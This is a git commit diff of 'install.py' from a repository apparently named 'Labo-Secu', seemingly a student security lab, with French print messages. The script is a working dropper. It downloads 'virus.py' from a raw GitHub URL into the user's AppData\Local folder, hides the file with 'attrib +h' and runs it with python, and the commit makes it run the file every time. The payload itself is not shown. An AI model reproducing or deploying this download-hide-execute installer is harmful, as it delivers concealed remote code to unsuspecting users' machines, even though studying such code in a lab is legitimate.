c80946b8c62e605e4cc62b0fd900f7e5456bdcfa
Saluc00 <lucas.usereau@ynov.com>
2020-02-19 10:57:01 +0100

    modif install

--- install.py
+++ install.py
@@ -1,16 +1,17 @@
-import os, requests
+import os, requests, subprocess
 
 # os.listdir(b'C:\Users\Saluc\AppData\Local')
 chemin = 'C:/Users/'+os.getcwd().split('\\')[2]+'/AppData/Local/'
-url = 'https://raw.githubusercontent.com/Saluc00/Labo-Secu/master/virus.py'
-req = requests.get(url).text
 
 if not os.path.exists(chemin+'virus.py') :
+       url = 'https://raw.githubusercontent.com/Saluc00/Labo-Secu/master/virus.py'
+       req = requests.get(url).text
        f = open(chemin+'virus.py', 'w+')
        os.system("attrib +h "+chemin+"virus.py")
        f.write(req)
        f.close()
        print('Fichier créer !')
-       print(os.system(f'python ' +chemin + 'virus.py'))
+       subprocess.call("python " +chemin + "virus.py")
 else:
        print('Déja créer..')
+       subprocess.call("python " +chemin + "virus.py")
